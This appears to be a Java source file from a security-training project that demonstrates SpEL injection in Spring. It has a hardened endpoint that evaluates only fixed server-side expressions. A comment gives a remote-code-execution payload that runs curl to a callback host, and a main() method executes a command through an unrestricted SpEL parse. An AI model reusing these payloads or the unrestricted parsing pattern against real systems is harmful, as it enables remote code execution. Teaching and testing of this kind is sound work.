package org.joychou.controller;

import org.springframework.web.util.HtmlUtils;
import org.springframework.expression.ConstructorResolver;
import org.springframework.expression.ExpressionParser;
import org.springframework.expression.MethodResolver;
import org.springframework.expression.PropertyAccessor;
import org.springframework.expression.spel.SpelEvaluationException;
import org.springframework.expression.spel.SpelMessage;
import org.springframework.expression.spel.standard.SpelExpressionParser;
import org.springframework.expression.spel.support.StandardEvaluationContext;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

import java.util.Collections;
import java.util.HashMap;
import java.util.Map;

/**
 * SpEL Injection
 *
 * @author JoyChou @2019-01-17
 */
@RestController
public class SpEL {

    /** Fixed set of expressions that may be evaluated; keys are the accepted request tokens. */
    private static final Map<String, String> NAMED_EXPRESSIONS;

    static {
        Map<String, String> m = new HashMap<String, String>();
        m.put("sum", "1 + 2");
        m.put("product", "6 * 7");
        m.put("greeting", "'Hello ' + 'SpEL'");
        NAMED_EXPRESSIONS = Collections.unmodifiableMap(m);
    }

    /**
     * SpEL to RCE
     * http://localhost:8080/spel/vul/?expression=xxx.
     * xxx is urlencode(exp)
     * exp: T(java.lang.Runtime).getRuntime().exec("curl xxx.ceye.io")
     */
    @GetMapping("/spel/vuln")
    public String rce(String expression) {
        ExpressionParser parser = new SpelExpressionParser();
        // Restricted context: no type references (T(...)), no constructors, no method calls,
        // no property/bean access. Only literals and operators can be evaluated.
        StandardEvaluationContext context = new StandardEvaluationContext();
        context.setTypeLocator(typeName -> {
            throw new SpelEvaluationException(SpelMessage.TYPE_NOT_FOUND, typeName);
        });
        context.setConstructorResolvers(Collections.<ConstructorResolver>emptyList());
        context.setMethodResolvers(Collections.<MethodResolver>emptyList());
        context.setPropertyAccessors(Collections.<PropertyAccessor>emptyList());
        context.setBeanResolver(null);
        // Request text is never parsed: it only selects a server-owned constant expression.
        String constantExpression = NAMED_EXPRESSIONS.get(expression == null ? "" : expression.trim());
        if (constantExpression == null) {
            return "Bad boy. I got u.";
        }
        Object value = parser.parseExpression(constantExpression).getValue(context);
        return HtmlUtils.htmlEscape(String.valueOf(value));
    }

    public static void main(String[] args) {
        ExpressionParser parser = new SpelExpressionParser();
        String expression = "T(java.lang.Runtime).getRuntime().exec(\"open -a Calculator\")";
        String result = parser.parseExpression(expression).getValue().toString();
        System.out.println(result);
    }
}

